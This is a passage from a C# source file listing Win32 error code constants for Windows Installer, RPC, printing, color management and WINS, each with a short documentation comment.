        public const int ERROR_INSTALL_TEMP_UNWRITABLE = 1632;
        /// <summary>
        /// This installation package is not supported by this processor type. Contact your product vendor.
        /// </summary>
        public const int ERROR_INSTALL_PLATFORM_UNSUPPORTED = 1633;
        /// <summary>
        /// Component not used on this computer.
        /// </summary>
        public const int ERROR_INSTALL_NOTUSED = 1634;
        /// <summary>
        /// This patch package could not be opened.  Verify that the patch package exists and that you can access it, or contact the application vendor to verify that this is a valid Windows Installer patch package.
        /// </summary>
        public const int ERROR_PATCH_PACKAGE_OPEN_FAILED = 1635;
        /// <summary>
        /// This patch package could not be opened.  Contact the application vendor to verify that this is a valid Windows Installer patch package.
        /// </summary>
        public const int ERROR_PATCH_PACKAGE_INVALID = 1636;
        /// <summary>
        /// This patch package cannot be processed by the Windows Installer service.  You must install a Windows service pack that contains a newer version of the Windows Installer service.
        /// </summary>
        public const int ERROR_PATCH_PACKAGE_UNSUPPORTED = 1637;
        /// <summary>
        /// Another version of this product is already installed.  Installation of this version cannot continue.  To configure or remove the existing version of this product, use Add/Remove Programs on the Control Panel.
        /// </summary>
        public const int ERROR_PRODUCT_VERSION = 1638;
        /// <summary>
        /// Invalid command line argument.  Consult the Windows Installer SDK for detailed command line help.
        /// </summary>
        public const int ERROR_INVALID_COMMAND_LINE = 1639;
        /// <summary>
        /// Only administrators have permission to add, remove, or configure server software during a Terminal services remote session. If you want to install or configure software on the server, contact your network administrator.
        /// </summary>
        public const int ERROR_INSTALL_REMOTE_DISALLOWED = 1640;
        /// <summary>
        /// The requested operation completed successfully.  The system will be restarted so the changes can take effect.
        /// </summary>
        public const int ERROR_SUCCESS_REBOOT_INITIATED = 1641;
        /// <summary>
        /// The upgrade patch cannot be installed by the Windows Installer service because the program to be upgraded may be missing, or the upgrade patch may update a different version of the program. Verify that the program to be upgraded exists on your computer an
        /// d that you have the correct upgrade patch.
        /// </summary>
        public const int ERROR_PATCH_TARGET_NOT_FOUND = 1642;
        /// <summary>
        /// The patch package is not permitted by software restriction policy.
        /// </summary>
        public const int ERROR_PATCH_PACKAGE_REJECTED = 1643;
        /// <summary>
        /// One or more customizations are not permitted by software restriction policy.
        /// </summary>
        public const int ERROR_INSTALL_TRANSFORM_REJECTED = 1644;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_INSTALL_REMOTE_PROHIBITED = 1645;
        /// <summary>
        /// The string binding is invalid.
        /// </summary>
        public const int RPC_S_INVALID_STRING_BINDING = 1700;
        /// <summary>
        /// The binding handle is not the correct type.
        /// </summary>
        public const int RPC_S_WRONG_KIND_OF_BINDING = 1701;
        /// <summary>
        /// The binding handle is invalid.
        /// </summary>
        public const int RPC_S_INVALID_BINDING = 1702;
        /// <summary>
        /// The RPC protocol sequence is not supported.
        /// </summary>
        public const int RPC_S_PROTSEQ_NOT_SUPPORTED = 1703;
        /// <summary>
        /// The RPC protocol sequence is invalid.
        /// </summary>
        public const int RPC_S_INVALID_RPC_PROTSEQ = 1704;
        /// <summary>
        /// The string universal unique identifier (UUID) is invalid.
        /// </summary>
        public const int RPC_S_INVALID_STRING_UUID = 1705;
        /// <summary>
        /// The endpoint format is invalid.
        /// </summary>
        public const int RPC_S_INVALID_ENDPOINT_FORMAT = 1706;
        /// <summary>
        /// The network address is invalid.
        /// </summary>
        public const int RPC_S_INVALID_NET_ADDR = 1707;
        /// <summary>
        /// No endpoint was found.
        /// </summary>
        public const int RPC_S_NO_ENDPOINT_FOUND = 1708;
        /// <summary>
        /// The timeout value is invalid.
        /// </summary>
        public const int RPC_S_INVALID_TIMEOUT = 1709;
        /// <summary>
        /// The object universal unique identifier (UUID) was not found.
        /// </summary>
        public const int RPC_S_OBJECT_NOT_FOUND = 1710;
        /// <summary>
        /// The object universal unique identifier (UUID) has already been registered.
        /// </summary>
        public const int RPC_S_ALREADY_REGISTERED = 1711;
        /// <summary>
        /// The type universal unique identifier (UUID) has already been registered.
        /// </summary>
        public const int RPC_S_TYPE_ALREADY_REGISTERED = 1712;
        /// <summary>
        /// The RPC server is already listening.
        /// </summary>
        public const int RPC_S_ALREADY_LISTENING = 1713;
        /// <summary>
        /// No protocol sequences have been registered.
        /// </summary>
        public const int RPC_S_NO_PROTSEQS_REGISTERED = 1714;
        /// <summary>
        /// The RPC server is not listening.
        /// </summary>
        public const int RPC_S_NOT_LISTENING = 1715;
        /// <summary>
        /// The manager type is unknown.
        /// </summary>
        public const int RPC_S_UNKNOWN_MGR_TYPE = 1716;
        /// <summary>
        /// The interface is unknown.
        /// </summary>
        public const int RPC_S_UNKNOWN_IF = 1717;
        /// <summary>
        /// There are no bindings.
        /// </summary>
        public const int RPC_S_NO_BINDINGS = 1718;
        /// <summary>
        /// There are no protocol sequences.
        /// </summary>
        public const int RPC_S_NO_PROTSEQS = 1719;
        /// <summary>
        /// The endpoint cannot be created.
        /// </summary>
        public const int RPC_S_CANT_CREATE_ENDPOINT = 1720;
        /// <summary>
        /// Not enough resources are available to complete this operation.
        /// </summary>
        public const int RPC_S_OUT_OF_RESOURCES = 1721;
        /// <summary>
        /// The RPC server is unavailable.
        /// </summary>
        public const int RPC_S_SERVER_UNAVAILABLE = 1722;
        /// <summary>
        /// The RPC server is too busy to complete this operation.
        /// </summary>
        public const int RPC_S_SERVER_TOO_BUSY = 1723;
        /// <summary>
        /// The network options are invalid.
        /// </summary>
        public const int RPC_S_INVALID_NETWORK_OPTIONS = 1724;
        /// <summary>
        /// There are no remote procedure calls active on this thread.
        /// </summary>
        public const int RPC_S_NO_CALL_ACTIVE = 1725;
        /// <summary>
        /// The remote procedure call failed.
        /// </summary>
        public const int RPC_S_CALL_FAILED = 1726;
        /// <summary>
        /// The remote procedure call failed and did not execute.
        /// </summary>
        public const int RPC_S_CALL_FAILED_DNE = 1727;
        /// <summary>
        /// A remote procedure call (RPC) protocol error occurred.
        /// </summary>
        public const int RPC_S_PROTOCOL_ERROR = 1728;
        /// <summary>
        /// The transfer syntax is not supported by the RPC server.
        /// </summary>
        public const int RPC_S_UNSUPPORTED_TRANS_SYN = 1730;
        /// <summary>
        /// The universal unique identifier (UUID) type is not supported.
        /// </summary>
        public const int RPC_S_UNSUPPORTED_TYPE = 1732;
        /// <summary>
        /// The tag is invalid.
        /// </summary>
        public const int RPC_S_INVALID_TAG = 1733;
        /// <summary>
        /// The array bounds are invalid.
        /// </summary>
        public const int RPC_S_INVALID_BOUND = 1734;
        /// <summary>
        /// The binding does not contain an entry name.
        /// </summary>
        public const int RPC_S_NO_ENTRY_NAME = 1735;
        /// <summary>
        /// The name syntax is invalid.
        /// </summary>
        public const int RPC_S_INVALID_NAME_SYNTAX = 1736;
        /// <summary>
        /// The name syntax is not supported.
        /// </summary>
        public const int RPC_S_UNSUPPORTED_NAME_SYNTAX = 1737;
        /// <summary>
        /// No network address is available to use to construct a universal unique identifier (UUID).
        /// </summary>
        public const int RPC_S_UUID_NO_ADDRESS = 1739;
        /// <summary>
        /// The endpoint is a duplicate.
        /// </summary>
        public const int RPC_S_DUPLICATE_ENDPOINT = 1740;
        /// <summary>
        /// The authentication type is unknown.
        /// </summary>
        public const int RPC_S_UNKNOWN_AUTHN_TYPE = 1741;
        /// <summary>
        /// The maximum number of calls is too small.
        /// </summary>
        public const int RPC_S_MAX_CALLS_TOO_SMALL = 1742;
        /// <summary>
        /// The string is too long.
        /// </summary>
        public const int RPC_S_STRING_TOO_Int32 = 1743;
        /// <summary>
        /// The RPC protocol sequence was not found.
        /// </summary>
        public const int RPC_S_PROTSEQ_NOT_FOUND = 1744;
        /// <summary>
        /// The procedure number is out of range.
        /// </summary>
        public const int RPC_S_PROCNUM_OUT_OF_RANGE = 1745;
        /// <summary>
        /// The binding does not contain any authentication information.
        /// </summary>
        public const int RPC_S_BINDING_HAS_NO_AUTH = 1746;
        /// <summary>
        /// The authentication service is unknown.
        /// </summary>
        public const int RPC_S_UNKNOWN_AUTHN_SERVICE = 1747;
        /// <summary>
        /// The authentication level is unknown.
        /// </summary>
        public const int RPC_S_UNKNOWN_AUTHN_LEVEL = 1748;
        /// <summary>
        /// The security context is invalid.
        /// </summary>
        public const int RPC_S_INVALID_AUTH_IDENTITY = 1749;
        /// <summary>
        /// The authorization service is unknown.
        /// </summary>
        public const int RPC_S_UNKNOWN_AUTHZ_SERVICE = 1750;
        /// <summary>
        /// The entry is invalid.
        /// </summary>
        public const int EPT_S_INVALID_ENTRY = 1751;
        /// <summary>
        /// The server endpoint cannot perform the operation.
        /// </summary>
        public const int EPT_S_CANT_PERFORM_OP = 1752;
        /// <summary>
        /// There are no more endpoints available from the endpoint mapper.
        /// </summary>
        public const int EPT_S_NOT_REGISTERED = 1753;
        /// <summary>
        /// No interfaces have been exported.
        /// </summary>
        public const int RPC_S_NOTHING_TO_EXPORT = 1754;
        /// <summary>
        /// The entry name is incomplete.
        /// </summary>
        public const int RPC_S_INCOMPLETE_NAME = 1755;
        /// <summary>
        /// The version option is invalid.
        /// </summary>
        public const int RPC_S_INVALID_VERS_OPTION = 1756;
        /// <summary>
        /// There are no more members.
        /// </summary>
        public const int RPC_S_NO_MORE_MEMBERS = 1757;
        /// <summary>
        /// There is nothing to unexport.
        /// </summary>
        public const int RPC_S_NOT_ALL_OBJS_UNEXPORTED = 1758;
        /// <summary>
        /// The interface was not found.
        /// </summary>
        public const int RPC_S_INTERFACE_NOT_FOUND = 1759;
        /// <summary>
        /// The entry already exists.
        /// </summary>
        public const int RPC_S_ENTRY_ALREADY_EXISTS = 1760;
        /// <summary>
        /// The entry is not found.
        /// </summary>
        public const int RPC_S_ENTRY_NOT_FOUND = 1761;
        /// <summary>
        /// The name service is unavailable.
        /// </summary>
        public const int RPC_S_NAME_SERVICE_UNAVAILABLE = 1762;
        /// <summary>
        /// The network address family is invalid.
        /// </summary>
        public const int RPC_S_INVALID_NAF_ID = 1763;
        /// <summary>
        /// The requested operation is not supported.
        /// </summary>
        public const int RPC_S_CANNOT_SUPPORT = 1764;
        /// <summary>
        /// No security context is available to allow impersonation.
        /// </summary>
        public const int RPC_S_NO_CONTEXT_AVAILABLE = 1765;
        /// <summary>
        /// An internal error occurred in a remote procedure call (RPC).
        /// </summary>
        public const int RPC_S_INTERNAL_ERROR = 1766;
        /// <summary>
        /// The RPC server attempted an integer division by zero.
        /// </summary>
        public const int RPC_S_ZERO_DIVIDE = 1767;
        /// <summary>
        /// An addressing error occurred in the RPC server.
        /// </summary>
        public const int RPC_S_ADDRESS_ERROR = 1768;
        /// <summary>
        /// A floating-point operation at the RPC server caused a division by zero.
        /// </summary>
        public const int RPC_S_FP_DIV_ZERO = 1769;
        /// <summary>
        /// A floating-point underflow occurred at the RPC server.
        /// </summary>
        public const int RPC_S_FP_UNDERFLOW = 1770;
        /// <summary>
        /// A floating-point overflow occurred at the RPC server.
        /// </summary>
        public const int RPC_S_FP_OVERFLOW = 1771;
        /// <summary>
        /// The list of RPC servers available for the binding of auto handles has been exhausted.
        /// </summary>
        public const int RPC_X_NO_MORE_ENTRIES = 1772;
        /// <summary>
        /// Unable to open the character translation table file.
        /// </summary>
        public const int RPC_X_SS_CHAR_TRANS_OPEN_FAIL = 1773;
        /// <summary>
        /// The file containing the character translation table has fewer than 512 bytes.
        /// </summary>
        public const int RPC_X_SS_CHAR_TRANS_Int16_FILE = 1774;
        /// <summary>
        /// A null context handle was passed from the client to the host during a remote procedure call.
        /// </summary>
        public const int RPC_X_SS_IN_NULL_CONTEXT = 1775;
        /// <summary>
        /// The context handle changed during a remote procedure call.
        /// </summary>
        public const int RPC_X_SS_CONTEXT_DAMAGED = 1777;
        /// <summary>
        /// The binding handles passed to a remote procedure call do not match.
        /// </summary>
        public const int RPC_X_SS_HANDLES_MISMATCH = 1778;
        /// <summary>
        /// The stub is unable to get the remote procedure call handle.
        /// </summary>
        public const int RPC_X_SS_CANNOT_GET_CALL_HANDLE = 1779;
        /// <summary>
        /// A null reference pointer was passed to the stub.
        /// </summary>
        public const int RPC_X_NULL_REF_POINTER = 1780;
        /// <summary>
        /// The enumeration value is out of range.
        /// </summary>
        public const int RPC_X_ENUM_VALUE_OUT_OF_RANGE = 1781;
        /// <summary>
        /// The byte count is too small.
        /// </summary>
        public const int RPC_X_BYTE_COUNT_TOO_SMALL = 1782;
        /// <summary>
        /// The stub received bad data.
        /// </summary>
        public const int RPC_X_BAD_STUB_DATA = 1783;
        /// <summary>
        /// The supplied user buffer is not valid for the requested operation.
        /// </summary>
        public const int ERROR_INVALID_USER_BUFFER = 1784;
        /// <summary>
        /// The disk media is not recognized. It may not be formatted.
        /// </summary>
        public const int ERROR_UNRECOGNIZED_MEDIA = 1785;
        /// <summary>
        /// The workstation does not have a trust secret.
        /// </summary>
        public const int ERROR_NO_TRUST_LSA_SECRET = 1786;
        /// <summary>
        /// The security database on the server does not have a computer account for this workstation trust relationship.
        /// </summary>
        public const int ERROR_NO_TRUST_SAM_ACCOUNT = 1787;
        /// <summary>
        /// The trust relationship between the primary domain and the trusted domain failed.
        /// </summary>
        public const int ERROR_TRUSTED_DOMAIN_FAILURE = 1788;
        /// <summary>
        /// The trust relationship between this workstation and the primary domain failed.
        /// </summary>
        public const int ERROR_TRUSTED_RELATIONSHIP_FAILURE = 1789;
        /// <summary>
        /// The network logon failed.
        /// </summary>
        public const int ERROR_TRUST_FAILURE = 1790;
        /// <summary>
        /// A remote procedure call is already in progress for this thread.
        /// </summary>
        public const int RPC_S_CALL_IN_PROGRESS = 1791;
        /// <summary>
        /// An attempt was made to logon, but the network logon service was not started.
        /// </summary>
        public const int ERROR_NETLOGON_NOT_STARTED = 1792;
        /// <summary>
        /// The user's account has expired.
        /// </summary>
        public const int ERROR_ACCOUNT_EXPIRED = 1793;
        /// <summary>
        /// The redirector is in use and cannot be unloaded.
        /// </summary>
        public const int ERROR_REDIRECTOR_HAS_OPEN_HANDLES = 1794;
        /// <summary>
        /// The specified printer driver is already installed.
        /// </summary>
        public const int ERROR_PRINTER_DRIVER_ALREADY_INSTALLED = 1795;
        /// <summary>
        /// The specified port is unknown.
        /// </summary>
        public const int ERROR_UNKNOWN_PORT = 1796;
        /// <summary>
        /// The printer driver is unknown.
        /// </summary>
        public const int ERROR_UNKNOWN_PRINTER_DRIVER = 1797;
        /// <summary>
        /// The print processor is unknown.
        /// </summary>
        public const int ERROR_UNKNOWN_PRINTPROCESSOR = 1798;
        /// <summary>
        /// The specified separator file is invalid.
        /// </summary>
        public const int ERROR_INVALID_SEPARATOR_FILE = 1799;
        /// <summary>
        /// The specified priority is invalid.
        /// </summary>
        public const int ERROR_INVALID_PRIORITY = 1800;
        /// <summary>
        /// The printer name is invalid.
        /// </summary>
        public const int ERROR_INVALID_PRINTER_NAME = 1801;
        /// <summary>
        /// The printer already exists.
        /// </summary>
        public const int ERROR_PRINTER_ALREADY_EXISTS = 1802;
        /// <summary>
        /// The printer command is invalid.
        /// </summary>
        public const int ERROR_INVALID_PRINTER_COMMAND = 1803;
        /// <summary>
        /// The specified datatype is invalid.
        /// </summary>
        public const int ERROR_INVALID_DATATYPE = 1804;
        /// <summary>
        /// The environment specified is invalid.
        /// </summary>
        public const int ERROR_INVALID_ENVIRONMENT = 1805;
        /// <summary>
        /// There are no more bindings.
        /// </summary>
        public const int RPC_S_NO_MORE_BINDINGS = 1806;
        /// <summary>
        /// The account used is an interdomain trust account. Use your global user account or local user account to access this server.
        /// </summary>
        public const int ERROR_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT = 1807;
        /// <summary>
        /// The account used is a computer account. Use your global user account or local user account to access this server.
        /// </summary>
        public const int ERROR_NOLOGON_WORKSTATION_TRUST_ACCOUNT = 1808;
        /// <summary>
        /// The account used is a server trust account. Use your global user account or local user account to access this server.
        /// </summary>
        public const int ERROR_NOLOGON_SERVER_TRUST_ACCOUNT = 1809;
        /// <summary>
        /// The name or security ID (SID) of the domain specified is inconsistent with the trust information for that domain.
        /// </summary>
        public const int ERROR_DOMAIN_TRUST_INCONSISTENT = 1810;
        /// <summary>
        /// The server is in use and cannot be unloaded.
        /// </summary>
        public const int ERROR_SERVER_HAS_OPEN_HANDLES = 1811;
        /// <summary>
        /// The specified image file did not contain a resource section.
        /// </summary>
        public const int ERROR_RESOURCE_DATA_NOT_FOUND = 1812;
        /// <summary>
        /// The specified resource type cannot be found in the image file.
        /// </summary>
        public const int ERROR_RESOURCE_TYPE_NOT_FOUND = 1813;
        /// <summary>
        /// The specified resource name cannot be found in the image file.
        /// </summary>
        public const int ERROR_RESOURCE_NAME_NOT_FOUND = 1814;
        /// <summary>
        /// The specified resource language ID cannot be found in the image file.
        /// </summary>
        public const int ERROR_RESOURCE_LANG_NOT_FOUND = 1815;
        /// <summary>
        /// Not enough quota is available to process this command.
        /// </summary>
        public const int ERROR_NOT_ENOUGH_QUOTA = 1816;
        /// <summary>
        /// No interfaces have been registered.
        /// </summary>
        public const int RPC_S_NO_INTERFACES = 1817;
        /// <summary>
        /// The remote procedure call was cancelled.
        /// </summary>
        public const int RPC_S_CALL_CANCELLED = 1818;
        /// <summary>
        /// The binding handle does not contain all required information.
        /// </summary>
        public const int RPC_S_BINDING_INCOMPLETE = 1819;
        /// <summary>
        /// A communications failure occurred during a remote procedure call.
        /// </summary>
        public const int RPC_S_COMM_FAILURE = 1820;
        /// <summary>
        /// The requested authentication level is not supported.
        /// </summary>
        public const int RPC_S_UNSUPPORTED_AUTHN_LEVEL = 1821;
        /// <summary>
        /// No principal name registered.
        /// </summary>
        public const int RPC_S_NO_PRINC_NAME = 1822;
        /// <summary>
        /// The error specified is not a valid Windows RPC error code.
        /// </summary>
        public const int RPC_S_NOT_RPC_ERROR = 1823;
        /// <summary>
        /// A UUID that is valid only on this computer has been allocated.
        /// </summary>
        public const int RPC_S_UUID_LOCAL_ONLY = 1824;
        /// <summary>
        /// A security package specific error occurred.
        /// </summary>
        public const int RPC_S_SEC_PKG_ERROR = 1825;
        /// <summary>
        /// Thread is not canceled.
        /// </summary>
        public const int RPC_S_NOT_CANCELLED = 1826;
        /// <summary>
        /// Invalid operation on the encoding/decoding handle.
        /// </summary>
        public const int RPC_X_INVALID_ES_ACTION = 1827;
        /// <summary>
        /// Incompatible version of the serializing package.
        /// </summary>
        public const int RPC_X_WRONG_ES_VERSION = 1828;
        /// <summary>
        /// Incompatible version of the RPC stub.
        /// </summary>
        public const int RPC_X_WRONG_STUB_VERSION = 1829;
        /// <summary>
        /// The RPC pipe object is invalid or corrupted.
        /// </summary>
        public const int RPC_X_INVALID_PIPE_OBJECT = 1830;
        /// <summary>
        /// An invalid operation was attempted on an RPC pipe object.
        /// </summary>
        public const int RPC_X_WRONG_PIPE_ORDER = 1831;
        /// <summary>
        /// Unsupported RPC pipe version.
        /// </summary>
        public const int RPC_X_WRONG_PIPE_VERSION = 1832;
        /// <summary>
        /// The group member was not found.
        /// </summary>
        public const int RPC_S_GROUP_MEMBER_NOT_FOUND = 1898;
        /// <summary>
        /// The endpoint mapper database entry could not be created.
        /// </summary>
        public const int EPT_S_CANT_CREATE = 1899;
        /// <summary>
        /// The object universal unique identifier (UUID) is the nil UUID.
        /// </summary>
        public const int RPC_S_INVALID_OBJECT = 1900;
        /// <summary>
        /// The specified time is invalid.
        /// </summary>
        public const int ERROR_INVALID_TIME = 1901;
        /// <summary>
        /// The specified form name is invalid.
        /// </summary>
        public const int ERROR_INVALID_FORM_NAME = 1902;
        /// <summary>
        /// The specified form size is invalid.
        /// </summary>
        public const int ERROR_INVALID_FORM_SIZE = 1903;
        /// <summary>
        /// The specified printer handle is already being waited on
        /// </summary>
        public const int ERROR_ALREADY_WAITING = 1904;
        /// <summary>
        /// The specified printer has been deleted.
        /// </summary>
        public const int ERROR_PRINTER_DELETED = 1905;
        /// <summary>
        /// The state of the printer is invalid.
        /// </summary>
        public const int ERROR_INVALID_PRINTER_STATE = 1906;
        /// <summary>
        /// The user's password must be changed before logging on the first time.
        /// </summary>
        public const int ERROR_PASSUInt16_MUST_CHANGE = 1907;
        /// <summary>
        /// Could not find the domain controller for this domain.
        /// </summary>
        public const int ERROR_DOMAIN_CONTROLLER_NOT_FOUND = 1908;
        /// <summary>
        /// The referenced account is currently locked out and may not be logged on to.
        /// </summary>
        public const int ERROR_ACCOUNT_LOCKED_OUT = 1909;
        /// <summary>
        /// The object exporter specified was not found.
        /// </summary>
        public const int OR_INVALID_OXID = 1910;
        /// <summary>
        /// The object specified was not found.
        /// </summary>
        public const int OR_INVALID_OID = 1911;
        /// <summary>
        /// The object resolver set specified was not found.
        /// </summary>
        public const int OR_INVALID_SET = 1912;
        /// <summary>
        /// Some data remains to be sent in the request buffer.
        /// </summary>
        public const int RPC_S_SEND_INCOMPLETE = 1913;
        /// <summary>
        /// Invalid asynchronous remote procedure call handle.
        /// </summary>
        public const int RPC_S_INVALID_ASYNC_HANDLE = 1914;
        /// <summary>
        /// Invalid asynchronous RPC call handle for this operation.
        /// </summary>
        public const int RPC_S_INVALID_ASYNC_CALL = 1915;
        /// <summary>
        /// The RPC pipe object has already been closed.
        /// </summary>
        public const int RPC_X_PIPE_CLOSED = 1916;
        /// <summary>
        /// The RPC call completed before all pipes were processed.
        /// </summary>
        public const int RPC_X_PIPE_DISCIPLINE_ERROR = 1917;
        /// <summary>
        /// No more data is available from the RPC pipe.
        /// </summary>
        public const int RPC_X_PIPE_EMPTY = 1918;
        /// <summary>
        /// No site name is available for this machine.
        /// </summary>
        public const int ERROR_NO_SITENAME = 1919;
        /// <summary>
        /// The file can not be accessed by the system.
        /// </summary>
        public const int ERROR_CANT_ACCESS_FILE = 1920;
        /// <summary>
        /// The name of the file cannot be resolved by the system.
        /// </summary>
        public const int ERROR_CANT_RESOLVE_FILENAME = 1921;
        /// <summary>
        /// The entry is not of the expected type.
        /// </summary>
        public const int RPC_S_ENTRY_TYPE_MISMATCH = 1922;
        /// <summary>
        /// Not all object UUIDs could be exported to the specified entry.
        /// </summary>
        public const int RPC_S_NOT_ALL_OBJS_EXPORTED = 1923;
        /// <summary>
        /// Interface could not be exported to the specified entry.
        /// </summary>
        public const int RPC_S_INTERFACE_NOT_EXPORTED = 1924;
        /// <summary>
        /// The specified profile entry could not be added.
        /// </summary>
        public const int RPC_S_PROFILE_NOT_ADDED = 1925;
        /// <summary>
        /// The specified profile element could not be added.
        /// </summary>
        public const int RPC_S_PRF_ELT_NOT_ADDED = 1926;
        /// <summary>
        /// The specified profile element could not be removed.
        /// </summary>
        public const int RPC_S_PRF_ELT_NOT_REMOVED = 1927;
        /// <summary>
        /// The group element could not be added.
        /// </summary>
        public const int RPC_S_GRP_ELT_NOT_ADDED = 1928;
        /// <summary>
        /// The group element could not be removed.
        /// </summary>
        public const int RPC_S_GRP_ELT_NOT_REMOVED = 1929;
        /// <summary>
        /// The printer driver is not compatible with a policy enabled on your computer that blocks NT 4.0 drivers.
        /// </summary>
        public const int ERROR_KM_DRIVER_BLOCKED = 1930;
        /// <summary>
        /// The context has expired and can no longer be used.
        /// </summary>
        public const int ERROR_CONTEXT_EXPIRED = 1931;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_PER_USER_TRUST_QUOTA_EXCEEDED = 1932;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_ALL_USER_TRUST_QUOTA_EXCEEDED = 1933;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_USER_DELETE_TRUST_QUOTA_EXCEEDED = 1934;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_AUTHENTICATION_FIREWALL_FAILED = 1935;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_REMOTE_PRINT_CONNECTIONS_BLOCKED = 1936;
        /// <summary>
        /// The pixel format is invalid.
        /// </summary>
        public const int ERROR_INVALID_PIXEL_FORMAT = 2000;
        /// <summary>
        /// The specified driver is invalid.
        /// </summary>
        public const int ERROR_BAD_DRIVER = 2001;
        /// <summary>
        /// The window style or class attribute is invalid for this operation.
        /// </summary>
        public const int ERROR_INVALID_WINDOW_STYLE = 2002;
        /// <summary>
        /// The requested metafile operation is not supported.
        /// </summary>
        public const int ERROR_METAFILE_NOT_SUPPORTED = 2003;
        /// <summary>
        /// The requested transformation operation is not supported.
        /// </summary>
        public const int ERROR_TRANSFORM_NOT_SUPPORTED = 2004;
        /// <summary>
        /// The requested clipping operation is not supported.
        /// </summary>
        public const int ERROR_CLIPPING_NOT_SUPPORTED = 2005;
        /// <summary>
        /// The specified color management module is invalid.
        /// </summary>
        public const int ERROR_INVALID_CMM = 2010;
        /// <summary>
        /// The specified color profile is invalid.
        /// </summary>
        public const int ERROR_INVALID_PROFILE = 2011;
        /// <summary>
        /// The specified tag was not found.
        /// </summary>
        public const int ERROR_TAG_NOT_FOUND = 2012;
        /// <summary>
        /// A required tag is not present.
        /// </summary>
        public const int ERROR_TAG_NOT_PRESENT = 2013;
        /// <summary>
        /// The specified tag is already present.
        /// </summary>
        public const int ERROR_DUPLICATE_TAG = 2014;
        /// <summary>
        /// The specified color profile is not associated with any device.
        /// </summary>
        public const int ERROR_PROFILE_NOT_ASSOCIATED_WITH_DEVICE = 2015;
        /// <summary>
        /// The specified color profile was not found.
        /// </summary>
        public const int ERROR_PROFILE_NOT_FOUND = 2016;
        /// <summary>
        /// The specified color space is invalid.
        /// </summary>
        public const int ERROR_INVALID_COLORSPACE = 2017;
        /// <summary>
        /// Image Color Management is not enabled.
        /// </summary>
        public const int ERROR_ICM_NOT_ENABLED = 2018;
        /// <summary>
        /// There was an error while deleting the color transform.
        /// </summary>
        public const int ERROR_DELETING_ICM_XFORM = 2019;
        /// <summary>
        /// The specified color transform is invalid.
        /// </summary>
        public const int ERROR_INVALID_TRANSFORM = 2020;
        /// <summary>
        /// The specified transform does not match the bitmap's color space.
        /// </summary>
        public const int ERROR_COLORSPACE_MISMATCH = 2021;
        /// <summary>
        /// The specified named color index is not present in the profile.
        /// </summary>
        public const int ERROR_INVALID_COLORINDEX = 2022;
        /// <summary>
        /// The network connection was made successfully, but the user had to be prompted for a password other than the one originally specified.
        /// </summary>
        public const int ERROR_CONNECTED_OTHER_PASSUInt16 = 2108;
        /// <summary>
        /// The network connection was made successfully using default credentials.
        /// </summary>
        public const int ERROR_CONNECTED_OTHER_PASSUInt16_DEFAULT = 2109;
        /// <summary>
        /// The specified username is invalid.
        /// </summary>
        public const int ERROR_BAD_USERNAME = 2202;
        /// <summary>
        /// This network connection does not exist.
        /// </summary>
        public const int ERROR_NOT_CONNECTED = 2250;
        /// <summary>
        /// This network connection has files open or requests pending.
        /// </summary>
        public const int ERROR_OPEN_FILES = 2401;
        /// <summary>
        /// Active connections still exist.
        /// </summary>
        public const int ERROR_ACTIVE_CONNECTIONS = 2402;
        /// <summary>
        /// The device is in use by an active process and cannot be disconnected.
        /// </summary>
        public const int ERROR_DEVICE_IN_USE = 2404;
        /// <summary>
        /// The specified print monitor is unknown.
        /// </summary>
        public const int ERROR_UNKNOWN_PRINT_MONITOR = 3000;
        /// <summary>
        /// The specified printer driver is currently in use.
        /// </summary>
        public const int ERROR_PRINTER_DRIVER_IN_USE = 3001;
        /// <summary>
        /// The spool file was not found.
        /// </summary>
        public const int ERROR_SPOOL_FILE_NOT_FOUND = 3002;
        /// <summary>
        /// A StartDocPrinter call was not issued.
        /// </summary>
        public const int ERROR_SPL_NO_STARTDOC = 3003;
        /// <summary>
        /// An AddJob call was not issued.
        /// </summary>
        public const int ERROR_SPL_NO_ADDJOB = 3004;
        /// <summary>
        /// The specified print processor has already been installed.
        /// </summary>
        public const int ERROR_PRINT_PROCESSOR_ALREADY_INSTALLED = 3005;
        /// <summary>
        /// The specified print monitor has already been installed.
        /// </summary>
        public const int ERROR_PRINT_MONITOR_ALREADY_INSTALLED = 3006;
        /// <summary>
        /// The specified print monitor does not have the required functions.
        /// </summary>
        public const int ERROR_INVALID_PRINT_MONITOR = 3007;
        /// <summary>
        /// The specified print monitor is currently in use.
        /// </summary>
        public const int ERROR_PRINT_MONITOR_IN_USE = 3008;
        /// <summary>
        /// The requested operation is not allowed when there are jobs queued to the printer.
        /// </summary>
        public const int ERROR_PRINTER_HAS_JOBS_QUEUED = 3009;
        /// <summary>
        /// The requested operation is successful. Changes will not be effective until the system is rebooted.
        /// </summary>
        public const int ERROR_SUCCESS_REBOOT_REQUIRED = 3010;
        /// <summary>
        /// The requested operation is successful. Changes will not be effective until the service is restarted.
        /// </summary>
        public const int ERROR_SUCCESS_RESTART_REQUIRED = 3011;
        /// <summary>
        /// No printers were found.
        /// </summary>
        public const int ERROR_PRINTER_NOT_FOUND = 3012;
        /// <summary>
        /// The printer driver is known to be unreliable.
        /// </summary>
        public const int ERROR_PRINTER_DRIVER_WARNED = 3013;
        /// <summary>
        /// The printer driver is known to harm the system.
        /// </summary>
        public const int ERROR_PRINTER_DRIVER_BLOCKED = 3014;
        /// <summary>
        /// WINS encountered an error while processing the command.
        /// </summary>
        public const int ERROR_WINS_INTERNAL = 4000;
        /// <summary>
        /// The local WINS can not be deleted.
        /// </summary>
        public const int ERROR_CAN_NOT_DEL_LOCAL_WINS = 4001;
        /// <summary>
        /// The importation from the file failed.
        /// </summary>
        public const int ERROR_STATIC_INIT = 4002;
        /// <summary>
        /// The backup failed. Was a full backup done before?
        /// </summary>
        public const int ERROR_INC_BACKUP = 4003;
        /// <summary>
        /// The backup failed. Check the directory to which you are backing the database.
        /// </summary>
        public const int ERROR_FULL_BACKUP = 4004;
        /// <summary>
        /// The name does not exist in the WINS database.
        /// </summary>
        public const int ERROR_REC_NON_EXISTENT = 4005;
        /// <summary>
        /// Replication with a nonconfigured partner is not allowed.
        /// </summary>
        public const int ERROR_RPL_NOT_ALLOWED = 4006;
        /// <summary>
